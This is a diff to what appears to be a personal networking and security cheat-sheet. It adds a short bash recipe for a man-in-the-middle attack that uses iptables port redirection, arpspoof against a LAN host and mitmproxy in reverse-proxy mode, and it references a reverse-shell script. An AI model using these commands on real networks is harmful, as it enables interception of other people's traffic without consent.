@@ -1,10 +1,9 @@
 # +
 
-~/code/cheats/reverse_shell.sh
+./reverse_shell.sh
+./wireshark.md
 
 google: mdn foo
-
-https://wiki.wireshark.org/Tools
 
 https://www.webpagetest.org/
 
@@ -328,6 +327,13 @@ https://sourceforge.net/projects/callflow/
 
 ~/code/snippets/arp_spoof.py
 
+```bash
+iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080
+arpspoof -i eth0 -t 192.168.10.9 192.168.10.10
+# reverse proxy mode
+mitmproxy -R https://192.168.10.10
+```
+
 # HTTP
 
 SYN and ACK bits sent and received in both directions
@@ -517,4 +523,8 @@ netstat -tulpn | \
     ' _ {}
 ```
 
+# url encoding
 
+```python
+urllib.unquote(c)
+```
